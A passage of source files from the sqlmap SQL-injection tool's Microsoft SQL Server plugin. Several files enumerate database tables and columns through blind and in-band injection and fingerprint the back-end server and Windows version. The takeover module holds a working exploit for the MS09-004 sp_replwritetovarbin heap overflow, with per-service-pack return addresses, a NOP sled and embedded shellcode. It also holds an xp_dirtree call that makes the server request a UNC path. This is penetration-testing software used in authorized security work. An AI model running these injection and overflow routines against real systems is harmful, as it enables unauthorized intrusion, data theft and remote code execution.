(rootQuery.inband.query, rootQuery.inband.query2, rootQuery.inband.query3):\n                    query = query.replace(\"%s\", db)\n                    value = inject.getValue(query, blind=False, time=False)\n                    if not isNoneValue(value):\n                        break\n\n                if not isNoneValue(value):\n                    value = [_ for _ in arrayizeValue(value) if _]\n                    value = [safeSQLIdentificatorNaming(unArrayizeValue(_), True) for _ in value]\n                    kb.data.cachedTables[db] = value\n\n        if not kb.data.cachedTables and isInferenceAvailable() and not conf.direct:\n            for db in dbs:\n                if conf.excludeSysDbs and db in self.excludeDbsList:\n                    infoMsg = \"skipping system database '%s'\" % db\n                    singleTimeLogMessage(infoMsg)\n                    continue\n\n                if conf.exclude and re.search(conf.exclude, db, re.I) is not None:\n                    infoMsg = \"skipping database '%s'\" % db\n                    singleTimeLogMessage(infoMsg)\n                    continue\n\n                infoMsg = \"fetching number of tables for \"\n                infoMsg += \"database '%s'\" % db\n                logger.info(infoMsg)\n\n                for query in (rootQuery.blind.count, rootQuery.blind.count2, rootQuery.blind.count3):\n                    _ = query.replace(\"%s\", db)\n                    count = inject.getValue(_, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n                    if not isNoneValue(count):\n                        break\n\n                if not isNumPosStrValue(count):\n                    if count != 0:\n                        warnMsg = \"unable to retrieve the number of \"\n                        warnMsg += \"tables for database '%s'\" % db\n                        logger.warning(warnMsg)\n                    continue\n\n                tables = []\n\n                for index in xrange(int(count)):\n                    _ = safeStringFormat((rootQuery.blind.query if query == rootQuery.blind.count else rootQuery.blind.query2 if query == rootQuery.blind.count2 else rootQuery.blind.query3).replace(\"%s\", db), index)\n\n                    table = inject.getValue(_, union=False, error=False)\n                    if not isNoneValue(table):\n                        kb.hintValue = table\n                        table = safeSQLIdentificatorNaming(table, True)\n                        tables.append(table)\n\n                if tables:\n                    kb.data.cachedTables[db] = tables\n                else:\n                    warnMsg = \"unable to retrieve the tables \"\n                    warnMsg += \"for database '%s'\" % db\n                    logger.warning(warnMsg)\n\n        if not kb.data.cachedTables and not conf.search:\n            errMsg = \"unable to retrieve the tables for any database\"\n            raise SqlmapNoneDataException(errMsg)\n        else:\n            for db, tables in kb.data.cachedTables.items():\n                kb.data.cachedTables[db] = sorted(tables) if tables else tables\n\n        return kb.data.cachedTables\n\n    def searchTable(self):\n        foundTbls = {}\n        tblList = conf.tbl.split(',')\n        rootQuery = queries[DBMS.MSSQL].search_table\n        tblCond = rootQuery.inband.condition\n        tblConsider, tblCondParam = self.likeOrExact(\"table\")\n\n        if conf.db == CURRENT_DB:\n            conf.db = self.getCurrentDb()\n\n        if conf.db:\n            enumDbs = conf.db.split(',')\n        elif not len(kb.data.cachedDbs):\n            enumDbs = self.getDbs()\n        else:\n            enumDbs = kb.data.cachedDbs\n\n        for db in enumDbs:\n            db = safeSQLIdentificatorNaming(db)\n            foundTbls[db] = []\n\n        for tbl in tblList:\n            tbl = safeSQLIdentificatorNaming(tbl, True)\n\n            infoMsg = \"searching table\"\n            if tblConsider == \"1\":\n                infoMsg += \"s LIKE\"\n            infoMsg += \" '%s'\" % unsafeSQLIdentificatorNaming(tbl)\n            logger.info(infoMsg)\n\n            tblQuery = \"%s%s\" % (tblCond, tblCondParam)\n            tblQuery = tblQuery % unsafeSQLIdentificatorNaming(tbl)\n\n            for db in foundTbls.keys():\n                db = safeSQLIdentificatorNaming(db)\n\n                if conf.excludeSysDbs and db in self.excludeDbsList:\n                    infoMsg = \"skipping system database '%s'\" % db\n                    singleTimeLogMessage(infoMsg)\n                    continue\n\n                if conf.exclude and re.search(conf.exclude, db, re.I) is not None:\n                    infoMsg = \"skipping database '%s'\" % db\n                    singleTimeLogMessage(infoMsg)\n                    continue\n\n                if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n                    query = rootQuery.inband.query.replace(\"%s\", db)\n                    query += tblQuery\n                    values = inject.getValue(query, blind=False, time=False)\n\n                    if not isNoneValue(values):\n                        if isinstance(values, six.string_types):\n                            values = [values]\n\n                        for foundTbl in values:\n                            if foundTbl is None:\n                                continue\n\n                            foundTbls[db].append(foundTbl)\n                else:\n                    infoMsg = \"fetching number of table\"\n                    if tblConsider == \"1\":\n                        infoMsg += \"s LIKE\"\n                    infoMsg += \" '%s' in database '%s'\" % (unsafeSQLIdentificatorNaming(tbl), unsafeSQLIdentificatorNaming(db))\n                    logger.info(infoMsg)\n\n                    query = rootQuery.blind.count\n                    query = query.replace(\"%s\", db)\n                    query += \" AND %s\" % tblQuery\n                    count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                    if not isNumPosStrValue(count):\n                        warnMsg = \"no table\"\n                        if tblConsider == \"1\":\n                            warnMsg += \"s LIKE\"\n                        warnMsg += \" '%s' \" % unsafeSQLIdentificatorNaming(tbl)\n                        warnMsg += \"in database '%s'\" % unsafeSQLIdentificatorNaming(db)\n                        logger.warning(warnMsg)\n\n                        continue\n\n                    indexRange = getLimitRange(count)\n\n                    for index in indexRange:\n                        query = rootQuery.blind.query\n                        query = query.replace(\"%s\", db)\n                        query += \" AND %s\" % tblQuery\n                        query = agent.limitQuery(index, query, tblCond)\n                        tbl = inject.getValue(query, union=False, error=False)\n                        kb.hintValue = tbl\n                        foundTbls[db].append(tbl)\n\n        for db, tbls in list(foundTbls.items()):\n            if len(tbls) == 0:\n                foundTbls.pop(db)\n\n        if not foundTbls:\n            warnMsg = \"no databases contain any of the provided tables\"\n            logger.warning(warnMsg)\n            return\n\n        conf.dumper.dbTables(foundTbls)\n        self.dumpFoundTables(foundTbls)\n\n    def searchColumn(self):\n        rootQuery = queries[DBMS.MSSQL].search_column\n        foundCols = {}\n        dbs = {}\n        whereTblsQuery = \"\"\n        infoMsgTbl = \"\"\n        infoMsgDb = \"\"\n        colList = conf.col.split(',')\n\n        if conf.exclude:\n            colList = [_ for _ in colList if re.search(conf.exclude, _, re.I) is None]\n\n        origTbl = conf.tbl\n        origDb = conf.db\n        colCond = rootQuery.inband.condition\n        tblCond = rootQuery.inband.condition2\n        colConsider, colCondParam = self.likeOrExact(\"column\")\n\n        if conf.db == CURRENT_DB:\n            conf.db = self.getCurrentDb()\n\n        if conf.db:\n            enumDbs = conf.db.split(',')\n        elif not len(kb.data.cachedDbs):\n            enumDbs = self.getDbs()\n        else:\n            enumDbs = kb.data.cachedDbs\n\n        for db in enumDbs:\n            db = safeSQLIdentificatorNaming(db)\n            dbs[db] = {}\n\n        for column in colList:\n            column = safeSQLIdentificatorNaming(column)\n            conf.db = origDb\n            conf.tbl = origTbl\n\n            infoMsg = \"searching column\"\n            if colConsider == \"1\":\n                infoMsg += \"s LIKE\"\n            infoMsg += \" '%s'\" % unsafeSQLIdentificatorNaming(column)\n\n            foundCols[column] = {}\n\n            if conf.tbl:\n                _ = conf.tbl.split(',')\n                whereTblsQuery = \" AND (\" + \" OR \".join(\"%s = '%s'\" % (tblCond, unsafeSQLIdentificatorNaming(tbl)) for tbl in _) + \")\"\n                infoMsgTbl = \" for table%s '%s'\" % (\"s\" if len(_) > 1 else \"\", \", \".join(tbl for tbl in _))\n\n            if conf.db == CURRENT_DB:\n                conf.db = self.getCurrentDb()\n\n            if conf.db:\n                _ = conf.db.split(',')\n                infoMsgDb = \" in database%s '%s'\" % (\"s\" if len(_) > 1 else \"\", \", \".join(db for db in _))\n            elif conf.excludeSysDbs:\n                infoMsgDb = \" not in system database%s '%s'\" % (\"s\" if len(self.excludeDbsList) > 1 else \"\", \", \".join(db for db in self.excludeDbsList))\n            else:\n                infoMsgDb = \" across all databases\"\n\n            logger.info(\"%s%s%s\" % (infoMsg, infoMsgTbl, infoMsgDb))\n\n            colQuery = \"%s%s\" % (colCond, colCondParam)\n            colQuery = colQuery % unsafeSQLIdentificatorNaming(column)\n\n            for db in (_ for _ in dbs if _):\n                db = safeSQLIdentificatorNaming(db)\n\n                if conf.excludeSysDbs and db in self.excludeDbsList:\n                    continue\n\n                if conf.exclude and re.search(conf.exclude, db, re.I) is not None:\n                    continue\n\n                if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n                    query = rootQuery.inband.query % (db, db, db, db, db, db)\n                    query += \" AND %s\" % colQuery.replace(\"[DB]\", db)\n                    query += whereTblsQuery.replace(\"[DB]\", db)\n                    values = inject.getValue(query, blind=False, time=False)\n\n                    if not isNoneValue(values):\n                        if isinstance(values, six.string_types):\n                            values = [values]\n\n                        for foundTbl in values:\n                            foundTbl = safeSQLIdentificatorNaming(unArrayizeValue(foundTbl), True)\n\n                            if foundTbl is None:\n                                continue\n\n                            if foundTbl not in dbs[db]:\n                                dbs[db][foundTbl] = {}\n\n                            if colConsider == '1':\n                                conf.db = db\n                                conf.tbl = foundTbl\n                                conf.col = column\n\n                                self.getColumns(onlyColNames=True, colTuple=(colConsider, colCondParam), bruteForce=False)\n\n                                if db in kb.data.cachedColumns and foundTbl in kb.data.cachedColumns[db] and not isNoneValue(kb.data.cachedColumns[db][foundTbl]):\n                                    dbs[db][foundTbl].update(kb.data.cachedColumns[db][foundTbl])\n\n                                kb.data.cachedColumns = {}\n                            else:\n                                dbs[db][foundTbl][column] = None\n\n                            if db in foundCols[column]:\n                                foundCols[column][db].append(foundTbl)\n                            else:\n                                foundCols[column][db] = [foundTbl]\n                else:\n                    foundCols[column][db] = []\n\n                    infoMsg = \"fetching number of tables containing column\"\n                    if colConsider == \"1\":\n                        infoMsg += \"s LIKE\"\n                    infoMsg += \" '%s' in database '%s'\" % (column, db)\n                    logger.info(\"%s%s\" % (infoMsg, infoMsgTbl))\n\n                    query = rootQuery.blind.count\n                    query = query % (db, db, db, db, db, db)\n                    query += \" AND %s\" % colQuery.replace(\"[DB]\", db)\n                    query += whereTblsQuery.replace(\"[DB]\", db)\n                    count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                    if not isNumPosStrValue(count):\n                        warnMsg = \"no tables contain column\"\n                        if colConsider == \"1\":\n                            warnMsg += \"s LIKE\"\n                        warnMsg += \" '%s' \" % column\n                        warnMsg += \"in database '%s'\" % db\n                        logger.warning(warnMsg)\n\n                        continue\n\n                    indexRange = getLimitRange(count)\n\n                    for index in indexRange:\n                        query = rootQuery.blind.query\n                        query = query % (db, db, db, db, db, db)\n                        query += \" AND %s\" % colQuery.replace(\"[DB]\", db)\n                        query += whereTblsQuery.replace(\"[DB]\", db)\n                        query = agent.limitQuery(index, query, colCond.replace(\"[DB]\", db))\n                        tbl = inject.getValue(query, union=False, error=False)\n                        kb.hintValue = tbl\n\n                        tbl = safeSQLIdentificatorNaming(tbl, True)\n\n                        if tbl not in dbs[db]:\n                            dbs[db][tbl] = {}\n\n                        if colConsider == \"1\":\n                            conf.db = db\n                            conf.tbl = tbl\n                            conf.col = column\n\n                            self.getColumns(onlyColNames=True, colTuple=(colConsider, colCondParam), bruteForce=False)\n\n                            if db in kb.data.cachedColumns and tbl in kb.data.cachedColumns[db]:\n                                dbs[db][tbl].update(kb.data.cachedColumns[db][tbl])\n                            kb.data.cachedColumns = {}\n                        else:\n                            dbs[db][tbl][column] = None\n\n                        foundCols[column][db].append(tbl)\n\n        conf.dumper.dbColumns(foundCols, colConsider, dbs)\n        self.dumpFoundColumn(dbs, foundCols, colConsider)\n", "plugins/dbms/mssqlserver/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import _mssql\n    import pymssql\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.convert import getText\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: http://www.pymssql.org/en/stable/\n    User guide: http://www.pymssql.org/en/stable/pymssql_examples.html\n    API: http://www.pymssql.org/en/stable/ref/pymssql.html\n    Debian package: python-pymssql\n    License: LGPL\n\n    Possible connectors: http://wiki.python.org/moin/SQL%20Server\n\n    Important note: pymssql library on your system MUST be version 1.0.2\n    to work, get it from http://sourceforge.net/projects/pymssql/files/pymssql/1.0.2/\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n\n        try:\n            self.connector = pymssql.connect(host=\"%s:%d\" % (self.hostname, self.port), user=self.user, password=self.password, database=self.db, login_timeout=conf.timeout, timeout=conf.timeout)\n        except (pymssql.Error, _mssql.MssqlDatabaseException) as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n        except ValueError:\n            raise SqlmapConnectionException\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except (pymssql.Error, _mssql.MssqlDatabaseException) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex).replace(\"\\n\", \" \"))\n            return None\n\n    def execute(self, query):\n        retVal = False\n\n        try:\n            self.cursor.execute(getText(query))\n            retVal = True\n        except (pymssql.OperationalError, pymssql.ProgrammingError) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex).replace(\"\\n\", \" \"))\n        except pymssql.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        return retVal\n\n    def select(self, query):\n        retVal = None\n\n        if self.execute(query):\n            retVal = self.fetchall()\n\n            try:\n                self.connector.commit()\n            except pymssql.OperationalError:\n                pass\n\n        return retVal\n", "plugins/dbms/mssqlserver/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97)+CHAR(98)+CHAR(99)+CHAR(100)+CHAR(101)+CHAR(102)+CHAR(103)+CHAR(104) FROM foobar\"\n        True\n        >>> Syntax.escape(u\"SELECT 'abcd\\xebfgh' FROM foobar\") == \"SELECT CHAR(97)+CHAR(98)+CHAR(99)+CHAR(100)+NCHAR(235)+CHAR(102)+CHAR(103)+CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"+\".join(\"%s(%d)\" % (\"CHAR\" if _ < 128 else \"NCHAR\", _) for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/mssqlserver/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import OS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import MSSQL_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.MSSQL)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n        actVer = Format.getDbms()\n\n        if not conf.extensiveFp:\n            value += actVer\n            return value\n\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            release = kb.bannerFp.get(\"dbmsRelease\")\n            version = kb.bannerFp.get(\"dbmsVersion\")\n            servicepack = kb.bannerFp.get(\"dbmsServicePack\")\n\n            if release and version and servicepack:\n                banVer = \"%s %s \" % (DBMS.MSSQL, release)\n                banVer += \"Service Pack %s \" % servicepack\n                banVer += \"version %s\" % version\n\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(MSSQL_ALIASES):\n            setDbms(\"%s %s\" % (DBMS.MSSQL, Backend.getVersion()))\n\n            self.getBanner()\n\n            Backend.setOs(OS.WINDOWS)\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.MSSQL\n        logger.info(infoMsg)\n\n        # NOTE: SELECT LEN(@@VERSION)=LEN(@@VERSION) FROM DUAL does not\n        # work connecting directly to the Microsoft SQL Server database\n        if conf.direct:\n            result = True\n        else:\n            result = inject.checkBooleanExpression(\"UNICODE(SQUARE(NULL)) IS NULL\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.MSSQL\n            logger.info(infoMsg)\n\n            for version, check in (\n                (\"2022\", \"CHARINDEX('16.0.',@@VERSION)>0\"),\n                (\"2019\", \"CHARINDEX('15.0.',@@VERSION)>0\"),\n                (\"Azure\", \"@@VERSION LIKE '%Azure%'\"),\n                (\"2017\", \"TRIM(NULL) IS NULL\"),\n                (\"2016\", \"ISJSON(NULL) IS NULL\"),\n                (\"2014\", \"CHARINDEX('12.0.',@@VERSION)>0\"),\n                (\"2012\", \"CONCAT(NULL,NULL)=CONCAT(NULL,NULL)\"),\n                (\"2008\", \"SYSDATETIME()=SYSDATETIME()\"),\n                (\"2005\", \"XACT_STATE()=XACT_STATE()\"),\n                (\"2000\", \"HOST_NAME()=HOST_NAME()\"),\n            ):\n                result = inject.checkBooleanExpression(check)\n\n                if result:\n                    Backend.setVersion(version)\n                    break\n\n            if Backend.getVersion():\n                setDbms(\"%s %s\" % (DBMS.MSSQL, Backend.getVersion()))\n            else:\n                setDbms(DBMS.MSSQL)\n\n            self.getBanner()\n\n            Backend.setOs(OS.WINDOWS)\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.MSSQL\n            logger.warning(warnMsg)\n\n            return False\n\n    def checkDbmsOs(self, detailed=False):\n        if Backend.getOs() and Backend.getOsVersion() and Backend.getOsServicePack():\n            return\n\n        if not Backend.getOs():\n            Backend.setOs(OS.WINDOWS)\n\n        if not detailed:\n            return\n\n        infoMsg = \"fingerprinting the back-end DBMS operating system \"\n        infoMsg += \"version and service pack\"\n        logger.info(infoMsg)\n\n        infoMsg = \"the back-end DBMS operating system is %s\" % Backend.getOs()\n\n        self.createSupportTbl(self.fileTblName, self.tblField, \"varchar(1000)\")\n        inject.goStacked(\"INSERT INTO %s(%s) VALUES (%s)\" % (self.fileTblName, self.tblField, \"@@VERSION\"))\n\n        # Reference: https://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions\n        # https://en.wikipedia.org/wiki/Windows_NT#Releases\n        versions = {\n            \"NT\": (\"4.0\", (6, 5, 4, 3, 2, 1)),\n            \"2000\": (\"5.0\", (4, 3, 2, 1)),\n            \"XP\": (\"5.1\", (3, 2, 1)),\n            \"2003\": (\"5.2\", (2, 1)),\n            \"Vista or 2008\": (\"6.0\", (2, 1)),\n            \"7 or 2008 R2\": (\"6.1\", (1, 0)),\n            \"8 or 2012\": (\"6.2\", (0,)),\n            \"8.1 or 2012 R2\": (\"6.3\", (0,)),\n            \"10 or 11 or 2016 or 2019 or 2022\": (\"10.0\", (0,))\n        }\n\n        # Get back-end DBMS underlying operating system version\n        for version, data in versions.items():\n            query = \"EXISTS(SELECT %s FROM %s WHERE %s \" % (self.tblField, self.fileTblName, self.tblField)\n            query += \"LIKE '%Windows NT \" + data[0] + \"%')\"\n            result = inject.checkBooleanExpression(query)\n\n            if result:\n                Backend.setOsVersion(version)\n                infoMsg += \" %s\" % Backend.getOsVersion()\n                break\n\n        if not Backend.getOsVersion():\n            Backend.setOsVersion(\"2003\")\n            Backend.setOsServicePack(2)\n\n            warnMsg = \"unable to fingerprint the underlying operating \"\n            warnMsg += \"system version, assuming it is Windows \"\n            warnMsg += \"%s Service Pack %d\" % (Backend.getOsVersion(), Backend.getOsServicePack())\n            logger.warning(warnMsg)\n\n            self.cleanup(onlyFileTbl=True)\n\n            return\n\n        # Get back-end DBMS underlying operating system service pack\n        sps = versions[Backend.getOsVersion()][1]\n        for sp in sps:\n            query = \"EXISTS(SELECT %s FROM %s WHERE %s \" % (self.tblField, self.fileTblName, self.tblField)\n            query += \"LIKE '%Service Pack \" + getUnicode(sp) + \"%')\"\n            result = inject.checkBooleanExpression(query)\n\n            if result:\n                Backend.setOsServicePack(sp)\n                break\n\n        if not Backend.getOsServicePack():\n            debugMsg = \"assuming the operating system has no service pack\"\n            logger.debug(debugMsg)\n\n            Backend.setOsServicePack(0)\n\n        if Backend.getOsVersion():\n            infoMsg += \" Service Pack %d\" % Backend.getOsServicePack()\n\n        logger.info(infoMsg)\n\n        self.cleanup(onlyFileTbl=True)\n", "plugins/dbms/mssqlserver/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport binascii\n\nfrom lib.core.common import Backend\nfrom lib.core.compat import xrange\nfrom lib.core.convert import getBytes\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom lib.request import inject\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def __init__(self):\n        self.spExploit = \"\"\n\n        GenericTakeover.__init__(self)\n\n    def uncPathRequest(self):\n        # inject.goStacked(\"EXEC master..xp_fileexist '%s'\" % self.uncPath, silent=True)\n        inject.goStacked(\"EXEC master..xp_dirtree '%s'\" % self.uncPath)\n\n    def spHeapOverflow(self):\n        \"\"\"\n        References:\n        * https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-004\n        * https://support.microsoft.com/en-us/help/959420/ms09-004-vulnerabilities-in-microsoft-sql-server-could-allow-remote-co\n        \"\"\"\n\n        returns = {\n            # 2003 Service Pack 0\n            \"2003-0\": (\"\"),\n\n            # 2003 Service Pack 1\n            \"2003-1\": (\"CHAR(0xab)+CHAR(0x2e)+CHAR(0xe6)+CHAR(0x7c)\", \"CHAR(0xee)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)\", \"CHAR(0xb5)+CHAR(0x60)+CHAR(0xa8)+CHAR(0x7c)\", \"CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)\", \"CHAR(0x03)+CHAR(0x1d)+CHAR(0x8f)+CHAR(0x7c)\", \"CHAR(0x13)+CHAR(0xe4)+CHAR(0x83)+CHAR(0x7c)\", \"CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)\", \"CHAR(0x1e)+CHAR(0x1d)+CHAR(0x88)+CHAR(0x7c)\"),\n\n            # 2003 Service Pack 2 updated at 12/2008\n            # \"2003-2\": (\"CHAR(0xe4)+CHAR(0x37)+CHAR(0xea)+CHAR(0x7c)\", \"CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)\", \"CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)\", \"CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)\", \"CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)\", \"CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)\", \"CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)\", \"CHAR(0x1b)+CHAR(0xa0)+CHAR(0x86)+CHAR(0x7c)\"),\n\n            # 2003 Service Pack 2 updated at 05/2009\n            \"2003-2\": (\"CHAR(0xc3)+CHAR(0xdb)+CHAR(0x67)+CHAR(0x77)\", \"CHAR(0x15)+CHAR(0xc9)+CHAR(0x93)+CHAR(0x7c)\", \"CHAR(0x96)+CHAR(0xdc)+CHAR(0xa7)+CHAR(0x7c)\", \"CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)\", \"CHAR(0x73)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)\", \"CHAR(0x47)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)\", \"CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)\", \"CHAR(0x0f)+CHAR(0x31)+CHAR(0x8e)+CHAR(0x7c)\"),\n\n            # 2003 Service Pack 2 updated at 09/2009\n            # \"2003-2\": (\"CHAR(0xc3)+CHAR(0xc2)+CHAR(0xed)+CHAR(0x7c)\", \"CHAR(0xf3)+CHAR(0xd9)+CHAR(0xa7)+CHAR(0x7c)\", \"CHAR(0x99)+CHAR(0xc8)+CHAR(0x93)+CHAR(0x7c)\", \"CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)\", \"CHAR(0x63)+CHAR(0x1e)+CHAR(0x8f)+CHAR(0x7c)\", \"CHAR(0x17)+CHAR(0xf5)+CHAR(0x83)+CHAR(0x7c)\", \"CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)\", \"CHAR(0xa4)+CHAR(0xde)+CHAR(0x8e)+CHAR(0x7c)\"),\n        }\n\n        addrs = None\n\n        for versionSp, data in returns.items():\n            version, sp = versionSp.split(\"-\")\n            sp = int(sp)\n\n            if Backend.getOsVersion() == version and Backend.getOsServicePack() == sp:\n                addrs = data\n\n                break\n\n        if not addrs:\n            errMsg = \"sqlmap can not exploit the stored procedure buffer \"\n            errMsg += \"overflow because it does not have a valid return \"\n            errMsg += \"code for the underlying operating system (Windows \"\n            errMsg += \"%s Service Pack %d)\" % (Backend.getOsVersion(), Backend.getOsServicePack())\n            raise SqlmapUnsupportedFeatureException(errMsg)\n\n        shellcodeChar = \"\"\n        hexStr = binascii.hexlify(getBytes(self.shellcodeString[:-1]))\n\n        for hexPair in xrange(0, len(hexStr), 2):\n            shellcodeChar += \"CHAR(0x%s)+\" % hexStr[hexPair:hexPair + 2]\n\n        shellcodeChar = shellcodeChar[:-1]\n\n        self.spExploit = \"\"\"DECLARE @buf NVARCHAR(4000),\n        @val NVARCHAR(4),\n        @counter INT\n        SET @buf = '\n        DECLARE @retcode int, @end_offset int, @vb_buffer varbinary, @vb_bufferlen int\n        EXEC master.dbo.sp_replwritetovarbin 347, @end_offset output, @vb_buffer output, @vb_bufferlen output,'''\n        SET @val = CHAR(0x41)\n        SET @counter = 0\n        WHILE @counter < 3320\n        BEGIN\n          SET @counter = @counter + 1\n          IF @counter = 411\n          BEGIN\n            /* pointer to call [ecx+8] */\n            SET @buf = @buf + %s\n\n            /* push ebp, pop esp, ret 4 */\n            SET @buf = @buf + %s\n\n            /* push ecx, pop esp, pop ebp, retn 8 */\n            SET @buf = @buf + %s\n\n            /* Garbage */\n            SET @buf = @buf + CHAR(0x51)+CHAR(0x51)+CHAR(0x51)+CHAR(0x51)\n\n            /* retn 1c */\n            SET @buf = @buf + %s\n\n            /* retn 1c */\n            SET @buf = @buf + %s\n\n            /* anti DEP */\n            SET @buf = @buf + %s\n\n            /* jmp esp */\n            SET @buf = @buf + %s\n\n            /* jmp esp */\n            SET @buf = @buf + %s\n\n            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)\n            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)\n            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)\n            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)\n            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)\n            SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)\n\n            set @buf = @buf + CHAR(0x64)+CHAR(0x8B)+CHAR(0x25)+CHAR(0x00)+CHAR(0x00)+CHAR(0x00)+CHAR(0x00)\n            set @buf = @buf + CHAR(0x8B)+CHAR(0xEC)\n            set @buf = @buf + CHAR(0x83)+CHAR(0xEC)+CHAR(0x20)\n\n            /* Metasploit shellcode */\n            SET @buf = @buf + %s\n\n            SET @buf = @buf + CHAR(0x6a)+CHAR(0x00)+char(0xc3)\n            SET @counter = @counter + 302\n            SET @val =  CHAR(0x43)\n            CONTINUE\n          END\n          SET @buf = @buf + @val\n        END\n        SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''\n        EXEC master..sp_executesql @buf\n        \"\"\" % (addrs[0], addrs[1], addrs[2], addrs[3], addrs[4], addrs[5], addrs[6], addrs[7], shellcodeChar)\n\n        self.spExploit = self.spExploit.replace(\"    \", \"\").replace(\"\\n\", \" \")\n\n        logger.info(\"triggering the buffer overflow vulnerability, please wait..\")\n        inject.goStacked(self.spExploit, silent=True)\n", 